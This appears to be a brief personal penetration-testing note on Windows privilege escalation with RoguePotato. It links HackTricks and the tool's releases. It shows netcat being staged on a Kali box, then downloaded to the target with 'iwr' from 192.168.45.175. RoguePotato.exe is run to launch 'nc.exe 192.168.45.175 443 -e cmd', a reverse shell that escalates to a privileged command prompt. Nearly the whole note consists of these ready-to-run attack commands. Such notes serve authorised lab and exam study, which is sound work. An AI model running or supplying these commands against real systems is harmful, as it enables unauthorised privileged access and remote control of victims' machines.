https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer#roguepotato

## Prepare reverse shell using netcat
Getting netcat to the folder of attacking
```
┌──(kali㉿kali)-[~/tools/printspoofer]
└─$ ls /home/kali/tools/netcat                      
nc64.exe  nc.exe  netcat.c
┌──(kali㉿kali)-[~/tools/printspoofer]
└─$ mv /home/kali/tools/netcat/nc64.exe /attackFolder/.
```

```
iwr -uri http://192.168.45.175/nc64.exe -OutFile nc64.exe
```

Binary
https://github.com/antonioCoco/RoguePotato
https://github.com/antonioCoco/RoguePotato/releases/tag/1.0

RoguePotato.exe is located in binary in my kali
## Creating a reverse shell
```
.\RoguePotato.exe -r 192.168.45.175 -e "c:\temp\nc.exe 192.168.45.175 443 -e cmd" -l 9999

# In some old versions you need to use the "-f" param

.\RoguePotato.exe -r 192.168.45.175 -e "c:\temp\nc.exe 192.168.45.175 443 -e cmd" -f 9999
```


